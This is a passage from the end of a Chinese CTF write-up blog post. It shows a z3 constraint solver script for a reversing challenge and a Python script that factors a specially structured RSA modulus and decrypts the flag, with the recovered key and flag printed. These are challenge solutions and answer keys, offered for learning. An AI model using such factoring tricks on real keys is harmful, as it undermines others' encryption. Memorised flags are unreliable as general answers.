+ <span class="number">60087</span> * a7 + <span class="number">59815</span> * a5 + <span class="number">15203</span> * a2 + <span class="number">62215</span> * a0 + <span class="number">19566</span> * a1 - <span class="number">30340</span> * a3 - <span class="number">15964</span> * a4 - <span class="number">13939</span> * a6 - <span class="number">43008</span> * a8 - <span class="number">44925</span> * a9 - <span class="number">49239</span> * a10 - <span class="number">40498</span> * a11 - <span class="number">54453</span> * a12 - <span class="number">33557</span> * a13 - <span class="number">24721</span> * a17 - <span class="number">21456</span> * a20 - <span class="number">40311</span> * a21 - <span class="number">61111</span> * a23 - <span class="number">18918</span> * a24 - <span class="number">33393</span> * a25 - <span class="number">9301</span> * a26 - <span class="number">61619</span> * a28 + <span class="number">58498</span> * a31 == <span class="number">-4472687</span>)</span><br><span class="line">s.add(</span><br><span class="line">    <span class="number">2766</span> * a29 + <span class="number">14305</span> * a28 + <span class="number">10809</span> * a26 + <span class="number">6578</span> * a24 + <span class="number">53612</span> * a23 + <span class="number">36333</span> * a21 + <span class="number">30380</span> * a20 + <span class="number">3633</span> * a19 + <span class="number">35027</span> * a18 + <span class="number">62097</span> * a15 + <span class="number">39085</span> * a14 + <span class="number">21483</span> * a13 + <span class="number">43131</span> * a11 + <span class="number">5725</span> * a9 + <span class="number">40291</span> * a8 + <span class="number">63291</span> * a5 + <span class="number">57560</span> * a4 + <span class="number">40977</span> * a3 + <span class="number">33894</span> * a2 + <span class="number">35423</span> * a0 - <span class="number">12994</span> * a1 - <span class="number">32256</span> * a6 - <span class="number">23534</span> * a7 - <span class="number">40660</span> * a10 - <span class="number">19119</span> * a12 - <span class="number">33732</span> * a16 - <span class="number">63756</span> * a17 - <span class="number">13528</span> * a22 - <span class="number">47605</span> * a25 - <span class="number">43202</span> * a27 - <span class="number">42819</span> * a30 - <span class="number">34232</span> * a31 == <span class="number">18523534</span>)</span><br><span class="line">s.add(</span><br><span class="line">    <span class="number">48054</span> * a29 + <span class="number">27903</span> * a28 + <span class="number">44427</span> * a27 + <span class="number">26215</span> * a26 + <span class="number">10136</span> * a25 + <span class="number">62674</span> * a20 + <span class="number">31419</span> * a19 + <span class="number">13647</span> * a18 + <span class="number">19761</span> * a15 + <span class="number">34155</span> * a11 + <span class="number">26302</span> * a7 + <span class="number">27559</span> * a6 + <span class="number">53130</span> * a5 + <span class="number">27162</span> * a4 + <span class="number">55103</span> * a3 + <span class="number">58838</span> * a2 + <span class="number">44942</span> * a0 + <span class="number">63420</span> * a1 - <span class="number">24313</span> * a8 - <span class="number">42499</span> * a9 - <span class="number">21629</span> * a10 - <span class="number">2633</span> * a12 - <span class="number">55014</span> * a13 - <span class="number">22926</span> * a14 - <span class="number">305</span> * a16 - <span class="number">63708</span> * a17 - <span class="number">32334</span> * a21 - <span class="number">47684</span> * a22 - <span class="number">54226</span> * a23 - <span class="number">50848</span> * a24 - <span class="number">15102</span> * a30 - <span class="number">22362</span> * a31 == <span class="number">20982750</span>)</span><br><span class="line">s.add(</span><br><span class="line">    <span class="number">59525</span> * a30 + <span class="number">23936</span> * a28 + <span class="number">61587</span> * a27 + <span class="number">4221</span> * a26 + <span class="number">55552</span> * a25 + <span class="number">13058</span> * a24 + <span class="number">45781</span> * a15 + <span class="number">65438</span> * a14 + <span class="number">51231</span> * a13 + <span class="number">33875</span> * a11 + <span class="number">6137</span> * a8 + <span class="number">62261</span> * a6 + <span class="number">46559</span> * a4 + <span class="number">26426</span> * a3 + <span class="number">9153</span> * a2 + <span class="number">6300</span> * a0 - <span class="number">30549</span> * a1 - <span class="number">55683</span> * a5 - <span class="number">44433</span> * a7 - <span class="number">46194</span> * a9 - <span class="number">57198</span> * a10 - <span class="number">45266</span> * a12 - <span class="number">6605</span> * a16 - <span class="number">43397</span> * a17 - <span class="number">7672</span> * a18 - <span class="number">48485</span> * a19 - <span class="number">54035</span> * a20 - <span class="number">12567</span> * a21 - <span class="number">47051</span> * a22 - <span class="number">62256</span> * a23 - <span class="number">9828</span> * a29 + <span class="number">50225</span> * a31 == <span class="number">5070455</span>)</span><br><span class="line">s.add(</span><br><span class="line">    <span class="number">39286</span> * a30 + <span class="number">13236</span> * a29 + <span class="number">42884</span> * a24 + <span class="number">12704</span> * a23 + <span class="number">53136</span> * a22 + <span class="number">47722</span> * a19 + <span class="number">30422</span> * a18 + <span class="number">10481</span> * a17 + <span class="number">55058</span> * a16 + <span class="number">63967</span> * a15 + <span class="number">8353</span> * a11 + <span class="number">62270</span> * a10 + <span class="number">12090</span> * a9 + <span class="number">14796</span> * a4 + <span class="number">59059</span> * a3 + <span class="number">5686</span> * a2 + <span class="number">-28415</span> * a0 + <span class="number">36297</span> * a1 - <span class="number">11307</span> * a5 - <span class="number">57251</span> * a6 - <span class="number">29507</span> * a7 - <span class="number">41415</span> * a8 - <span class="number">24476</span> * a12 - <span class="number">41751</span> * a13 - <span class="number">46589</span> * a14 - <span class="number">55870</span> * a20 - <span class="number">6321</span> * a21 - <span class="number">34350</span> * a25 - <span class="number">32922</span> * a26 - <span class="number">64909</span> * a27 - <span class="number">50870</span> * a28 + <span class="number">49349</span> * a31 == <span class="number">3066924</span>)</span><br><span class="line">s.add(</span><br><span class="line">    <span class="number">18612</span> * a27 + <span class="number">54808</span> * a25 + <span class="number">42491</span> * a23 + <span class="number">16634</span> * a22 + <span class="number">52361</span> * a21 + <span class="number">6252</span> * a20 + <span class="number">63445</span> * a18 + <span class="number">57764</span> * a16 + <span class="number">3991</span> * a15 + <span class="number">61646</span> * a14 + <span class="number">23244</span> * a10 + <span class="number">29174</span> * a9 + <span class="number">5707</span> * a6 + <span class="number">63976</span> * a4 + <span class="number">58731</span> * a2 + <span class="number">15479</span> * a0 + <span class="number">10453</span> * a1 - <span class="number">9782</span> * a3 - <span class="number">9166</span> * a5 - <span class="number">21516</span> * a7 - <span class="number">2689</span> * a8 - <span class="number">47968</span> * a11 - <span class="number">38843</span> * a12 - <span class="number">13488</span> * a13 - <span class="number">57649</span> * a17 - <span class="number">487</span> * a19 - <span class="number">30704</span> * a24 - <span class="number">61218</span> * a26 - <span class="number">32873</span> * a28 - <span class="number">58677</span> * a29 - <span class="number">2280</span> * a30 + <span class="number">35233</span> * a31 == <span class="number">26232118</span>)</span><br><span class="line">s.add(</span><br><span class="line">    <span class="number">38132</span> * a30 + <span class="number">58430</span> * a28 + <span class="number">38392</span> * a27 + <span class="number">29396</span> * a25 + <span class="number">15688</span> * a24 + <span class="number">28509</span> * a21 + <span class="number">23301</span> * a17 + <span class="number">56629</span> * a16 + <span class="number">11252</span> * a14 + <span class="number">28641</span> * a13 + <span class="number">35504</span> * a12 + <span class="number">41197</span> * a11 + <span class="number">9520</span> * a4 + <span class="number">50614</span> * a2 + <span class="number">36368</span> * a0 - <span class="number">30534</span> * a1 - <span class="number">7805</span> * a3 - <span class="number">60795</span> * a5 - <span class="number">17511</span> * a6 - <span class="number">34692</span> * a7 - <span class="number">22139</span> * a8 - <span class="number">49013</span> * a9 - <span class="number">24672</span> * a10 - <span class="number">22264</span> * a15 - <span class="number">55578</span> * a18 - <span class="number">61882</span> * a19 - <span class="number">48469</span> * a20 - <span class="number">8197</span> * a22 - <span class="number">43020</span> * a23 - <span class="number">36911</span> * a26 - <span class="number">6762</span> * a29 + <span class="number">56670</span> * a31 == <span class="number">-860377</span>)</span><br><span class="line">s.add(</span><br><span class="line">    <span class="number">19958</span> * a29 + <span class="number">35318</span> * a27 + <span class="number">58305</span> * a24 + <span class="number">55072</span> * a20 + <span class="number">58300</span> * a16 + <span class="number">16494</span> * a13 + <span class="number">61205</span> * a9 + <span class="number">8511</span> * a8 + <span class="number">21876</span> * a6 + <span class="number">1791</span> * a3 + <span class="number">28247</span> * a2 + <span class="number">3542</span> * a0 - <span class="number">17533</span> * a1 - <span class="number">44455</span> * a4 - <span class="number">2748</span> * a5 - <span class="number">38052</span> * a7 - <span class="number">16528</span> * a10 - <span class="number">4664</span> * a11 - <span class="number">13326</span> * a12 - <span class="number">52661</span> * a14 - <span class="number">38860</span> * a15 - <span class="number">60164</span> * a17 - <span class="number">39975</span> * a18 - <span class="number">19566</span> * a19 - <span class="number">55251</span> * a21 - <span class="number">8160</span> * a22 - <span class="number">54674</span> * a23 - <span class="number">29010</span> * a25 - <span class="number">6627</span> * a26 - <span class="number">15962</span> * a28 - <span class="number">10549</span> * a30 - <span class="number">8177</span> * a31 == <span class="number">-14482154</span>)</span><br><span class="line">s.add(</span><br><span class="line">    <span class="number">15394</span> * a29 + <span class="number">13827</span> * a28 + <span class="number">47703</span> * a27 + <span class="number">37204</span> * a26 + <span class="number">8621</span> * a23 + <span class="number">26034</span> * a20 + <span class="number">38644</span> * a19 + <span class="number">26883</span> * a18 + <span class="number">31346</span> * a17 + <span class="number">29853</span> * a15 + <span class="number">2052</span> * a13 + <span class="number">37617</span> * a8 + <span class="number">35004</span> * a3 + <span class="number">25124</span> * a2 + <span class="number">-7510</span> * a0 - <span class="number">61303</span> * a1 - <span class="number">34033</span> * a4 - <span class="number">49161</span> * a5 - <span class="number">6021</span> * a6 - <span class="number">36125</span> * a7 - <span class="number">10528</span> * a9 - <span class="number">47741</span> * a10 - <span class="number">45531</span> * a11 - <span class="number">1546</span> * a12 - <span class="number">59464</span> * a14 - <span class="number">22656</span> * a16 - <span class="number">24655</span> * a21 - <span class="number">9816</span> * a22 - <span class="number">22299</span> * a24 - <span class="number">23745</span> * a25 - <span class="number">23945</span> * a30 + <span class="number">48741</span> * a31 == <span class="number">-17062269</span>)</span><br><span class="line">s.add(</span><br><span class="line">    <span class="number">27496</span> * a29 + <span class="number">8511</span> * a27 + <span class="number">61644</span> * a26 + <span class="number">35917</span> * a24 + <span class="number">16432</span> * a21 + <span class="number">53570</span> * a19 + <span class="number">30949</span> * a18 + <span class="number">56668</span> * a16 + <span class="number">5395</span> * a15 + <span class="number">47866</span> * a14 + <span class="number">33349</span> * a12 + <span class="number">41169</span> * a9 + <span class="number">34746</span> * a6 + <span class="number">39102</span> * a5 + <span class="number">19310</span> * a0 + <span class="number">1288</span> * a1 - <span class="number">38840</span> * a2 - <span class="number">49229</span> * a3 - <span class="number">40618</span> * a4 - <span class="number">41363</span> * a7 - <span class="number">45367</span> * a8 - <span class="number">21440</span> * a10 - <span class="number">36535</span> * a11 - <span class="number">43289</span> * a13 - <span class="number">41392</span> * a17 - <span class="number">40337</span> * a20 - <span class="number">1430</span> * a22 - <span class="number">28334</span> * a23 - <span class="number">46487</span> * a25 - <span class="number">42458</span> * a28 - <span class="number">59664</span> * a30 + <span class="number">64335</span> * a31 == <span class="number">6695285</span>)</span><br><span class="line">s.add(</span><br><span class="line">    <span class="number">41403</span> * a29 + <span class="number">13806</span> * a27 + <span class="number">26203</span> * a26 + <span class="number">59304</span> * a24 + <span class="number">56824</span> * a22 + <span class="number">3954</span> * a21 + <span class="number">33269</span> * a20 + <span class="number">12986</span> * a16 + <span class="number">60427</span> * a15 + <span class="number">42087</span> * a14 + <span class="number">30996</span> * a13 + <span class="number">51835</span> * a11 + <span class="number">53494</span> * a9 + <span class="number">33384</span> * a8 + <span class="number">41797</span> * a4 + <span class="number">17974</span> * a3 + <span class="number">-18187</span> * a0 + <span class="number">28981</span> * a1 - <span class="number">53485</span> * a2 - <span class="number">20458</span> * a5 - <span class="number">8491</span> * a6 - <span class="number">16831</span> * a7 - <span class="number">31995</span> * a10 - <span class="number">12109</span> * a12 - <span class="number">51691</span> * a17 - <span class="number">58925</span> * a18 - <span class="number">40872</span> * a19 - <span class="number">30202</span> * a23 - <span class="number">30793</span> * a25 - <span class="number">42110</span> * a28 - <span class="number">1100</span> * a30 - <span class="number">26194</span> * a31 == <span class="number">16909859</span>)</span><br><span class="line">s.add(</span><br><span class="line">    <span class="number">53536</span> * a29 + <span class="number">47559</span> * a28 + <span class="number">42732</span> * a24 + <span class="number">34737</span> * a23 + <span class="number">48156</span> * a22 + <span class="number">15071</span> * a21 + <span class="number">38175</span> * a18 + <span class="number">12186</span> * a17 + <span class="number">28859</span> * a16 + <span class="number">19225</span> * a13 + <span class="number">28950</span> * a11 + <span class="number">19883</span> * a9 + <span class="number">40590</span> * a7 + <span class="number">44081</span> * a5 + <span class="number">20386</span> * a4 + <span class="number">-40011</span> * a0 - <span class="number">26232</span> * a1 - <span class="number">4849</span> * a2 - <span class="number">60564</span> * a3 - <span class="number">50739</span> * a6 - <span class="number">17237</span> * a8 - <span class="number">35381</span> * a10 - <span class="number">4203</span> * a12 - <span class="number">50964</span> * a14 - <span class="number">39946</span> * a15 - <span class="number">22511</span> * a19 - <span class="number">20539</span> * a20 - <span class="number">60250</span> * a25 - <span class="number">61430</span> * a26 - <span class="number">11009</span> * a27 - <span class="number">8879</span> * a30 + <span class="number">46741</span> * a31 == <span class="number">-1622782</span>)</span><br><span class="line">s.add(</span><br><span class="line">    <span class="number">5442</span> * a29 + <span class="number">45907</span> * a28 + <span class="number">7689</span> * a27 + <span class="number">56136</span> * a25 + <span class="number">20039</span> * a24 + <span class="number">18672</span> * a23 + <span class="number">41239</span> * a22 + <span class="number">9871</span> * a20 + <span class="number">34328</span> * a18 + <span class="number">27387</span> * a17 + <span class="number">41615</span> * a16 + <span class="number">41961</span> * a13 + <span class="number">50367</span> * a12 + <span class="number">59350</span> * a8 + <span class="number">29632</span> * a7 + <span class="number">22126</span> * a6 + <span class="number">61953</span> * a5 + <span class="number">34932</span> * a4 + <span class="number">3756</span> * a3 + <span class="number">-42653</span> * a0 + <span class="number">43668</span> * a1 - <span class="number">10988</span> * a2 - <span class="number">48711</span> * a9 - <span class="number">23958</span> * a10 - <span class="number">33557</span> * a11 - <span class="number">17831</span> * a14 - <span class="number">4583</span> * a15 - <span class="number">29750</span> * a19 - <span class="number">49888</span> * a21 - <span class="number">30956</span> * a26 - <span class="number">41068</span> * a30 + <span class="number">23514</span> * a31 == <span class="number">33025495</span>)</span><br><span class="line">s.add(</span><br><span class="line">    <span class="number">41909</span> * a26 + <span class="number">24036</span> * a24 + <span class="number">21760</span> * a22 + <span class="number">50228</span> * a21 + <span class="number">63177</span> * a19 + <span class="number">6738</span> * a18 + <span class="number">869</span> * a17 + <span class="number">19553</span> * a15 + <span class="number">53583</span> * a14 + <span class="number">59508</span> * a13 + <span class="number">15986</span> * a11 + <span class="number">3678</span> * a5 + <span class="number">10458</span> * a4 + <span class="number">5179</span> * a3 + <span class="number">38342</span> * a2 + <span class="number">-26968</span> * a0 - <span class="number">23313</span> * a1 - <span class="number">32333</span> * a6 - <span class="number">43275</span> * a7 - <span class="number">2423</span> * a8 - <span class="number">60827</span> * a9 - <span class="number">42621</span> * a10 - <span class="number">27590</span> * a12 - <span class="number">56307</span> * a16 - <span class="number">30359</span> * a20 - <span class="number">19919</span> * a23 - <span class="number">18153</span> * a25 - <span class="number">6931</span> * a27 - <span class="number">5822</span> * a28 - <span class="number">30949</span> * a29 - <span class="number">16572</span> * a30 + <span class="number">11920</span> * a31 == <span class="number">-10454601</span>)</span><br><span class="line">s.add(</span><br><span class="line">    <span class="number">43819</span> * a29 + <span class="number">54696</span> * a27 + <span class="number">55323</span> * a24 + <span class="number">63177</span> * a23 + <span class="number">6747</span> * a22 + <span class="number">31098</span> * a21 + <span class="number">37870</span> * a18 + <span class="number">55168</span> * a16 + <span class="number">1703</span> * a15 + <span class="number">64744</span> * a14 + <span class="number">57567</span> * a12 + <span class="number">35013</span> * a11 + <span class="number">52295</span> * a10 + <span class="number">46356</span> * a9 + <span class="number">29760</span> * a7 + <span class="number">4313</span> * a6 + <span class="number">18877</span> * a5 + <span class="number">8314</span> * a4 + <span class="number">35980</span> * a2 + <span class="number">8386</span> * a0 + <span class="number">57646</span> * a1 - <span class="number">4029</span> * a3 - <span class="number">47059</span> * a8 - <span class="number">25490</span> * a13 - <span class="number">62526</span> * a17 - <span class="number">63227</span> * a19 - <span class="number">27315</span> * a20 - <span class="number">23370</span> * a25 - <span class="number">37329</span> * a26 - <span class="number">6309</span> * a28 - <span class="number">12433</span> * a30 + <span class="number">8882</span> * a31 == <span class="number">51177223</span>)</span><br><span class="line">s.add(</span><br><span class="line">    <span class="number">17153</span> * a27 + <span class="number">41549</span> * a26 + <span class="number">28202</span> * a24 + <span class="number">36806</span> * a23 + <span class="number">12690</span> * a22 + <span class="number">42821</span> * a20 + <span class="number">39834</span> * a19 + <span class="number">17994</span> * a17 + <span class="number">32765</span> * a14 + <span class="number">25687</span> * a10 + <span class="number">33388</span> * a9 + <span class="number">143</span> * a4 + <span class="number">63776</span> * a0 + <span class="number">8682</span> * a1 - <span class="number">16324</span> * a2 - <span class="number">20022</span> * a3 - <span class="number">48973</span> * a5 - <span class="number">57775</span> * a6 - <span class="number">43820</span> * a7 - <span class="number">41070</span> * a8 - <span class="number">15669</span> * a11 - <span class="number">6946</span> * a12 - <span class="number">23187</span> * a13 - <span class="number">46495</span> * a15 - <span class="number">8395</span> * a16 - <span class="number">27782</span> * a18 - <span class="number">46043</span> * a21 - <span class="number">15428</span> * a25 - <span class="number">59010</span> * a28 - <span class="number">49235</span> * a29 - <span class="number">53666</span> * a30 + <span class="number">28539</span> * a31 == <span class="number">-15479857</span>)</span><br><span class="line">s.check()</span><br><span class="line">m = s.model()</span><br><span class="line">s = []</span><br><span class="line">s.append(chr(m[a0].as_long()))</span><br><span class="line">s.append(chr(m[a1].as_long()))</span><br><span class="line">s.append(chr(m[a2].as_long()))</span><br><span class="line">s.append(chr(m[a3].as_long()))</span><br><span class="line">s.append(chr(m[a4].as_long()))</span><br><span class="line">s.append(chr(m[a5].as_long()))</span><br><span class="line">s.append(chr(m[a6].as_long()))</span><br><span class="line">s.append(chr(m[a7].as_long()))</span><br><span class="line">s.append(chr(m[a8].as_long()))</span><br><span class="line">s.append(chr(m[a9].as_long()))</span><br><span class="line">s.append(chr(m[a10].as_long()))</span><br><span class="line">s.append(chr(m[a11].as_long()))</span><br><span class="line">s.append(chr(m[a12].as_long()))</span><br><span class="line">s.append(chr(m[a13].as_long()))</span><br><span class="line">s.append(chr(m[a14].as_long()))</span><br><span class="line">s.append(chr(m[a15].as_long()))</span><br><span class="line">s.append(chr(m[a16].as_long()))</span><br><span class="line">s.append(chr(m[a17].as_long()))</span><br><span class="line">s.append(chr(m[a18].as_long()))</span><br><span class="line">s.append(chr(m[a19].as_long()))</span><br><span class="line">s.append(chr(m[a20].as_long()))</span><br><span class="line">s.append(chr(m[a21].as_long()))</span><br><span class="line">s.append(chr(m[a22].as_long()))</span><br><span class="line">s.append(chr(m[a23].as_long()))</span><br><span class="line">s.append(chr(m[a24].as_long()))</span><br><span class="line">s.append(chr(m[a25].as_long()))</span><br><span class="line">s.append(chr(m[a26].as_long()))</span><br><span class="line">s.append(chr(m[a27].as_long()))</span><br><span class="line">s.append(chr(m[a28].as_long()))</span><br><span class="line">s.append(chr(m[a29].as_long()))</span><br><span class="line">s.append(chr(m[a30].as_long()))</span><br><span class="line">s.append(chr(m[a31].as_long()))</span><br><span class="line"><span class="comment"># print bytes(s).decode()</span></span><br><span class="line">a = [<span class="string">'c'</span>, <span class="string">'s'</span>, <span class="string">'2'</span>, <span class="string">'8'</span>, <span class="string">'R'</span>, <span class="string">'t'</span>, <span class="string">'t'</span>, <span class="string">'h'</span>, <span class="string">'H'</span>, <span class="string">'q'</span>, <span class="string">'s'</span>, <span class="string">'b'</span>, <span class="string">'u'</span>, <span class="string">'f'</span>, <span class="string">'o'</span>, <span class="string">'j'</span>, <span class="string">'s'</span>, <span class="string">'L'</span>, <span class="string">'z'</span>, <span class="string">'7'</span>, <span class="string">'y'</span>, <span class="string">'g'</span>, <span class="string">'2'</span>,</span><br><span class="line">     <span class="string">'D'</span>, <span class="string">'Y'</span>, <span class="string">'q'</span>, <span class="string">'W'</span>, <span class="string">'Q'</span>, <span class="string">'E'</span>, <span class="string">'E'</span>, <span class="string">'c'</span>, <span class="string">'Y'</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"\b"</span> + i,</span><br><span class="line"></span><br><span class="line"><span class="comment"># cs28RtthHqsbufojsLz7yg2DYqWQEEcY</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="rsa1"><a href="#rsa1" class="headerlink" title="rsa1"></a>rsa1</h4><p>说来也巧，上两周的<a href="https://southsea.st/2019/11/10/2019-BYB-Preliminary/#math">福建省赛</a>刚解过一次同类型的。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">16396023285324039009558195962852040868243807971027796599580351414803675753933120024077886501736987010658812435904022750269541456641256887079780585729054681025921699044139927086676479128232499416835051090240458236280851063589059069181638802191717911599940897797235038838827322737207584188123709413077535201099325099110746196702421778588988049442604655243604852727791349351291721230577933794627015369213339150586418524473465234375420448340981330049205933291705601563283196409846408465061438001010141891397738066420524119638524908958331406698679544896351376594583883601612086738834989175070317781690217164773657939589691476539613343289431727103692899002758373929815089904574190511978680084831183328681104467553713888762965976896013404518316128288520016934828176674482545660323358594211794461624622116836</span></span><br><span class="line">n = <span class="number">21173064304574950843737446409192091844410858354407853391518219828585809575546480463980354529412530785625473800210661276075473243912578032636845746866907991400822100939309254988798139819074875464612813385347487571449985243023886473371811269444618192595245380064162413031254981146354667983890607067651694310528489568882179752700069248266341927980053359911075295668342299406306747805925686573419756406095039162847475158920069325898899318222396609393685237607183668014820188522330005608037386873926432131081161531088656666402464062741934007562757339219055643198715643442608910351994872740343566582808831066736088527333762011263273533065540484105964087424030617602336598479611569611018708530024591023015267812545697478378348866840434551477126856261767535209092047810194387033643274333303926423370062572301</span></span><br><span class="line"></span><br><span class="line">a_front = str(n)[:<span class="number">200</span>]</span><br><span class="line">a_after = str(n)[<span class="number">-200</span>:]</span><br><span class="line">a_center = str(n)[<span class="number">200</span>:<span class="number">-200</span>]</span><br><span class="line"></span><br><span class="line">a2_b2 = int(<span class="string">"1"</span> + a_center) - int(a_after + a_front) + <span class="number">1</span></span><br><span class="line">ab = int(str(int(a_front) - <span class="number">1</span>) + a_after)</span><br><span class="line"></span><br><span class="line">a_plus_b = gmpy2.iroot(a2_b2 + <span class="number">2</span> * ab, <span class="number">2</span>)</span><br><span class="line">a_reduce_b = gmpy2.iroot(a2_b2 - <span class="number">2</span> * ab, <span class="number">2</span>)</span><br><span class="line"><span class="comment"># print a_plus_b, a_reduce_b</span></span><br><span class="line"></span><br><span class="line">a_plus_b = <span class="number">106838564591144305676926782070047912332321708552599459433421988005590173618301409441680963131339125642947008343458604585435014375496821988389947672305582602421970993398746844212869008998505794666381010</span></span><br><span class="line">a_reduce_b = <span class="number">54270186678010731553949991319969930487691255406327041359307445729571793416734930873100299986170777117022211293344445720881101722862892913267074929159777144041266065578072445135827424558087738564056836</span></span><br><span class="line"></span><br><span class="line">a = (a_plus_b + a_reduce_b) // <span class="number">2</span></span><br><span class="line">b = a_plus_b - a</span><br><span class="line"><span class="comment"># print a</span></span><br><span class="line"><span class="comment"># print b</span></span><br><span class="line"></span><br><span class="line">p = int(str(a) + str(b))</span><br><span class="line">q = int(str(b) + str(a))</span><br><span class="line">f = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e, f)</span><br><span class="line">flag = pow(c, d, n)</span><br><span class="line"><span class="keyword">print</span> long_to_bytes(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;637c3dda0a943c9e837ede64cba71cbcf8e0be7bb1ca9ea1de8b9aa589ce703f&#125;</span></span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/Web/" rel="tag"><i class="fa fa-tag"></i> Web</a>
+              <a href="/tags/CTF/" rel="tag"><i class="fa fa-tag"></i> CTF</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/Study-SQLI-Tricks/" rel="prev" title="一些关于SQL注入的绕过技巧">
+      <i class="fa fa-chevron-left"></i> 一些关于SQL注入的绕过技巧
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2019-D3CTF/" rel="next" title="2019 D3CTF 部分题解">
+      2019 D3CTF 部分题解 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Web"><span class="nav-number">1.</span> <span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#ezbypass"><span class="nav-number">1.1.</span> <span class="nav-text">ezbypass</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ezjava"><span class="nav-number">1.2.</span> <span class="nav-text">ezjava</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ezupload"><span class="nav-number">1.3.</span> <span class="nav-text">ezupload</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ezpop"><span class="nav-number">1.4.</span> <span class="nav-text">ezpop</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ezwaf"><span class="nav-number">1.5.</span> <span class="nav-text">ezwaf</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Misc"><span class="nav-number">2.</span> <span class="nav-text">Misc</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#misc2"><span class="nav-number">2.1.</span> <span class="nav-text">misc2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#misc3"><span class="nav-number">2.2.</span> <span class="nav-text">misc3</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#webshell"><span class="nav-number">2.3.</span> <span class="nav-text">webshell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#twocats"><span class="nav-number">2.4.</span> <span class="nav-text">twocats</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Reserve"><span class="nav-number">3.</span> <span class="nav-text">Reserve</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#re1"><span class="nav-number">3.1.</span> <span class="nav-text">re1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#re2"><span class="nav-number">3.2.</span> <span class="nav-text">re2</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Crypto"><span class="nav-number">4.</span> <span class="nav-text">Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#rsa1"><span class="nav-number">4.1.</span> <span class="nav-text">rsa1</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="南溟丷"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">南溟丷</p>
+  <div class="site-description" itemprop="description">我想在那里最蓝的大海扬帆</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">66</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
